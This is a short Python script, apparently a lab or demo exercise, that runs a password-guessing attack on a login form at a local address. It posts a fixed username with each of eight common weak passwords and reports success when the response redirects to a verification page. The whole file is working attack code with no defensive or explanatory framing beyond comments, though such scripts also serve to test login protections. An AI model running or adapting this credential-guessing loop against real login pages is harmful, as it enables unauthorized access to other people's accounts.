import requests

# Attack target address (login page)
URL = "http://127.0.0.1:5000/"

# Simulate username (assuming it is known）
username = "yihan "

# Emulating common weak password dictionaries
password_list = [
    "123456", "admin", "password", "12345678", "qwerty", "abc123", "111111", "123123"
]

# Iterate through trying each combination of passwords
for password in password_list:
    data = {
        "username": username,
        "password": password
    }
    response = requests.post(URL, data=data)

    # Output response status and prompts
    print(f"Trying password: {password}")
    print(f"Response: {response.text[:100]}")  # Display only the first 100 characters

    # If the CAPTCHA page redirection appears, it means that it may be successful to proceed to the next step
    if "verify" in response.url:
        print("✅ Password found and login passed to verification!")
        break
